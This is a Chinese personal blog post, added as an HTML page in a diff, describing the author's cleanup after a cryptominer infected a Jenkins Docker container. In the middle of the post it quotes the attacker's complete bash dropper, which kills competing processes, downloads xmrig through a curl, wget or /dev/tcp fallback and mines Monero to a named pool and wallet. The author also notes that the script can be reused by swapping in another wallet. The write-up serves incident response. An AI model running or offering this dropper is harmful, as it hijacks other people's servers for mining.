@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"baby7.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"right","Muse | Mist":320,"width":300,"display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="服务器CPU达到100%居高不下，查询时间发现情况持续了不止一天，最后发现是Jenkins漏洞导致的挖矿程序入侵">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jenkins容器遭到挖矿程序入侵后的梳理和解决">
+<meta property="og:url" content="https://baby7.github.io/myBlog/105.html">
+<meta property="og:site_name" content="七仔的博客">
+<meta property="og:description" content="服务器CPU达到100%居高不下，查询时间发现情况持续了不止一天，最后发现是Jenkins漏洞导致的挖矿程序入侵">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://media.baby7blog.com/1627894743264134994">
+<meta property="article:published_time" content="2021-08-02T08:55:56.000Z">
+<meta property="article:modified_time" content="2024-08-28T08:25:20.869Z">
+<meta property="article:author" content="七仔">
+<meta property="article:tag" content="建站">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://media.baby7blog.com/1627894743264134994">
+
+<link rel="canonical" href="https://baby7.github.io/myBlog/105.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Jenkins容器遭到挖矿程序入侵后的梳理和解决 | 七仔的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="七仔的博客" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">七仔的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">七仔的博客</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/index.html" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://baby7.github.io/myBlog/105.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://media.baby7blog.com/1724133440168933713">
+      <meta itemprop="name" content="七仔">
+      <meta itemprop="description" content="主要记录自己在写程序过程中的发现、问题、成果">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="七仔的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Jenkins容器遭到挖矿程序入侵后的梳理和解决
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-08-02 16:55:56" itemprop="dateCreated datePublished" datetime="2021-08-02T16:55:56+08:00">2021-08-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-08-28 16:25:20" itemprop="dateModified" datetime="2024-08-28T16:25:20+08:00">2024-08-28</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9B%B8%E5%85%B3/" itemprop="url" rel="index"><span itemprop="name">服务器相关</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <div align="center"> <img src="https://media.baby7blog.com/1627894743264134994" width=200 /> </div>
+
+<p>服务器CPU达到100%居高不下，查询时间发现情况持续了不止一天，最后发现是Jenkins漏洞导致的挖矿程序入侵</p>
+<span id="more"></span>
+
+<blockquote>
+<h1 id="Jenkins容器遭到挖矿程序入侵后的梳理和解决"><a href="#Jenkins容器遭到挖矿程序入侵后的梳理和解决" class="headerlink" title="Jenkins容器遭到挖矿程序入侵后的梳理和解决"></a>Jenkins容器遭到挖矿程序入侵后的梳理和解决</h1></blockquote>
+<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>服务器CPU达到100%居高不下，查询时间发现情况持续了不止一天</p>
+<h2 id="揪出来原因"><a href="#揪出来原因" class="headerlink" title="揪出来原因"></a>揪出来原因</h2><p>通过定位发现占用CPU的是Jenkins的Docker容器，使用命令进入容器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it jenkins-server /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>然后使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pa -aux</span><br></pre></td></tr></table></figure>
+
+<p>发现有一个程序占用异常的高</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./trace -r 2 -R 2 --keepalive --no-color --donate-level 1 --max-cpu-usage 100 --cpu-priority 3 --print-time 25 --threads 1 --url pool.minexmr.com:4444 --user 44uNsPQyuLZEcfoAzs3Y78f942zLGkH8W6xAbZKU1PQ8bE35ud3kUr82c7WtYaa6FDezVLcVaZ5RJPENgQCShYsKMgckdku --pass x --keepalive</span><br></pre></td></tr></table></figure>
+
+<p>和他同一时间启动的还有一个脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash /tmp/jenkins6638567374534053250.sh</span><br></pre></td></tr></table></figure>
+
+<p>找到这个文件看看（不要自己运行）:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ $(<span class="built_in">whoami</span>) != <span class="string">&quot;root&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">tr</span> <span class="keyword">in</span> $(ps -U $(<span class="built_in">whoami</span>) | egrep -v <span class="string">&quot;java|ps|sh|egrep|grep|PID&quot;</span> | <span class="built_in">cut</span> -b1-6); <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">kill</span> -9 <span class="variable">$tr</span> || : ;</span><br><span class="line">    <span class="keyword">done</span>;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">threadCount=$(lscpu | grep <span class="string">&#x27;CPU(s)&#x27;</span> | grep -v <span class="string">&#x27;,&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | <span class="built_in">head</span> -n 1);</span><br><span class="line">hostHash=$(hostname -f | <span class="built_in">md5sum</span> | <span class="built_in">cut</span> -c1-8);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;hostHash&#125;</span> - <span class="variable">$&#123;threadCount&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">_curl</span></span> () &#123;</span><br><span class="line">  <span class="built_in">read</span> proto server path &lt;&lt;&lt;$(<span class="built_in">echo</span> <span class="variable">$&#123;1//// &#125;</span>)</span><br><span class="line">  DOC=/<span class="variable">$&#123;path// //&#125;</span></span><br><span class="line">  HOST=<span class="variable">$&#123;server//:*&#125;</span></span><br><span class="line">  PORT=<span class="variable">$&#123;server//*:&#125;</span></span><br><span class="line">  [[ x<span class="string">&quot;<span class="variable">$&#123;HOST&#125;</span>&quot;</span> == x<span class="string">&quot;<span class="variable">$&#123;PORT&#125;</span>&quot;</span> ]] &amp;&amp; PORT=80</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exec</span> 3&lt;&gt;/dev/tcp/<span class="variable">$&#123;HOST&#125;</span>/<span class="variable">$PORT</span></span><br><span class="line">  <span class="built_in">echo</span> -en <span class="string">&quot;GET <span class="variable">$&#123;DOC&#125;</span> HTTP/1.0\r\nHost: <span class="variable">$&#123;HOST&#125;</span>\r\n\r\n&quot;</span> &gt;&amp;3</span><br><span class="line">  (<span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span></span><br><span class="line">   [[ <span class="string">&quot;<span class="variable">$line</span>&quot;</span> == $<span class="string">&#x27;\r&#x27;</span> ]] &amp;&amp; <span class="built_in">break</span></span><br><span class="line">  <span class="keyword">done</span> &amp;&amp; <span class="built_in">cat</span>) &lt;&amp;3</span><br><span class="line">  <span class="built_in">exec</span> 3&gt;&amp;-</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf config.json;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">d</span></span> () &#123;</span><br><span class="line">        curl -L --insecure --connect-timeout 5 --max-time 40 --fail <span class="variable">$1</span> -o <span class="variable">$2</span> 2&gt; /dev/null || wget --no-check-certificate --<span class="built_in">timeout</span> 40 --tries 1 <span class="variable">$1</span> -O <span class="variable">$2</span> 2&gt; /dev/null || _curl <span class="variable">$1</span> &gt; $                     2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span> ! -s trace &amp;&amp; \</span><br><span class="line">    d https://github.com/xmrig/xmrig/releases/download/v6.4.0/xmrig-6.4.0-linux-x64.tar.gz trace.tgz &amp;&amp; \</span><br><span class="line">    tar -zxvf trace.tgz &amp;&amp; \</span><br><span class="line">    <span class="built_in">mv</span> xmrig-6.4.0/xmrig trace &amp;&amp; \</span><br><span class="line">    <span class="built_in">rm</span> -rf xmrig-6.4.0 &amp;&amp; \</span><br><span class="line">    <span class="built_in">rm</span> -rf trace.tgz;</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span> ! -x trace &amp;&amp; <span class="built_in">chmod</span> +x trace;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">k</span></span>() &#123;</span><br><span class="line">    ./trace \</span><br><span class="line">        -r 2 \</span><br><span class="line">        -R 2 \</span><br><span class="line">        --keepalive \</span><br><span class="line">        --no-color \</span><br><span class="line">        --donate-level 1 \</span><br><span class="line">        --max-cpu-usage 100 \</span><br><span class="line">        --cpu-priority 3 \</span><br><span class="line">        --print-time 25 \</span><br><span class="line">        --threads <span class="variable">$&#123;threadCount:-4&#125;</span> \</span><br><span class="line">        --url <span class="variable">$1</span> \</span><br><span class="line">        --user 44uNsPQyuLZEcfoAzs3Y78f942zLGkH8W6xAbZKU1PQ8bE35ud3kUr82c7WtYaa6FDezVLcVaZ5RJPENgQCShYsKMgckdku \</span><br><span class="line">        --pass x \</span><br><span class="line">        --keepalive</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k pool.minexmr.com:4444</span><br></pre></td></tr></table></figure>
+
+<p>github项目的地址是一个挖矿程序，<a target="_blank" rel="noopener" href="https://minexmr.com/">https://minexmr.com</a>网址打开后发现是一个门罗币的矿池，脚本原理应该很清晰了：</p>
+<ul>
+<li><p>首先通过<a target="_blank" rel="noopener" href="https://github.com/xmrig/xmrig/releases/download/v6.4.0/xmrig-6.4.0-linux-x64.tar.gz">https://github.com/xmrig/xmrig/releases/download/v6.4.0/xmrig-6.4.0-linux-x64.tar.gz</a>下载挖矿程序</p>
+</li>
+<li><p>然后解压启动里面的trace挖矿主程序</p>
+</li>
+<li><p>挖矿的通信地址是<a href="pool.minexmr.com:4444">pool.minexmr.com:4444</a></p>
+</li>
+</ul>
+<p>这是一个比较通用的脚本，只需要在这个矿池注册账号拿到(–user)后面的东西就可以替换运行</p>
+<h2 id="入侵方式猜测"><a href="#入侵方式猜测" class="headerlink" title="入侵方式猜测"></a>入侵方式猜测</h2><p>应该是Jenkins的漏洞，根据搜索引擎的帮助，可能是通过穷举法暴力破解Jenkins的密码进行注入</p>
+<h2 id="操作和防范"><a href="#操作和防范" class="headerlink" title="操作和防范"></a>操作和防范</h2><p>首先删除workspace目录下多出来的那个目录securejenkins，然后kill掉那两个进程</p>
+<p>登录Jenkins修改了下授权策略（之前忘了密码所以修改这个来修改密码但是忘了改回来），改为[登录用户可以做任何事]</p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%BB%BA%E7%AB%99/" rel="tag"># 建站</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/myBlog/104.html" rel="prev" title="Maven项目转换为Gradle项目">
+      <i class="fa fa-chevron-left"></i> Maven项目转换为Gradle项目
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/myBlog/106.html" rel="next" title="HarmonyOS - 开发一个微博热搜服务卡片">
+      HarmonyOS - 开发一个微博热搜服务卡片 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Jenkins%E5%AE%B9%E5%99%A8%E9%81%AD%E5%88%B0%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F%E5%85%A5%E4%BE%B5%E5%90%8E%E7%9A%84%E6%A2%B3%E7%90%86%E5%92%8C%E8%A7%A3%E5%86%B3"><span class="nav-number">1.</span> <span class="nav-text">Jenkins容器遭到挖矿程序入侵后的梳理和解决</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B5%B7%E5%9B%A0"><span class="nav-number">1.1.</span> <span class="nav-text">起因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%AA%E5%87%BA%E6%9D%A5%E5%8E%9F%E5%9B%A0"><span class="nav-number">1.2.</span> <span class="nav-text">揪出来原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%A5%E4%BE%B5%E6%96%B9%E5%BC%8F%E7%8C%9C%E6%B5%8B"><span class="nav-number">1.3.</span> <span class="nav-text">入侵方式猜测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E5%92%8C%E9%98%B2%E8%8C%83"><span class="nav-number">1.4.</span> <span class="nav-text">操作和防范</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="七仔"
+      src="https://media.baby7blog.com/1724133440168933713">
+  <p class="site-author-name" itemprop="name">七仔</p>
+  <div class="site-description" itemprop="description">主要记录自己在写程序过程中的发现、问题、成果</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">115</span>
+          <span class="site-state-item-name">文章</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/baby7" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;baby7" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/baby7blog@foxmail.com" title="E-Mail → baby7blog@foxmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.hcworld.xyz/" title="https:&#x2F;&#x2F;www.hcworld.xyz" rel="noopener" target="_blank">张红尘的博客</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.qqsuu.cn/" title="https:&#x2F;&#x2F;blog.qqsuu.cn&#x2F;" rel="noopener" target="_blank">大米博客</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://kymjs.com/" title="https:&#x2F;&#x2F;kymjs.com&#x2F;" rel="noopener" target="_blank">开源实验室</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://my.gintama.love/" title="https:&#x2F;&#x2F;my.gintama.love&#x2F;" rel="noopener" target="_blank">HanSan'Blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://howiehz.top/" title="https:&#x2F;&#x2F;howiehz.top&#x2F;" rel="noopener" target="_blank">皓子的小站</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.wexiami.com/" title="https:&#x2F;&#x2F;blog.wexiami.com&#x2F;" rel="noopener" target="_blank">大熊要飞翔</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.chaoniulian.com/" title="https:&#x2F;&#x2F;www.chaoniulian.com&#x2F;" rel="noopener" target="_blank">超牛链AI</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://sugarat.top/" title="https:&#x2F;&#x2F;sugarat.top&#x2F;" rel="noopener" target="_blank">粥里有勺糖</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.baiwulin.com/" title="https:&#x2F;&#x2F;www.baiwulin.com&#x2F;" rel="noopener" target="_blank">雾林博客</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://greatdk.com/" title="https:&#x2F;&#x2F;greatdk.com&#x2F;" rel="noopener" target="_blank">DK博客</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.jdjwzx233.cn/" title="https:&#x2F;&#x2F;www.jdjwzx233.cn&#x2F;" rel="noopener" target="_blank">jdjwzx233-Blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.gadore.top/" title="https:&#x2F;&#x2F;blog.gadore.top&#x2F;" rel="noopener" target="_blank">千里之豪的格物垛</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">七仔</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
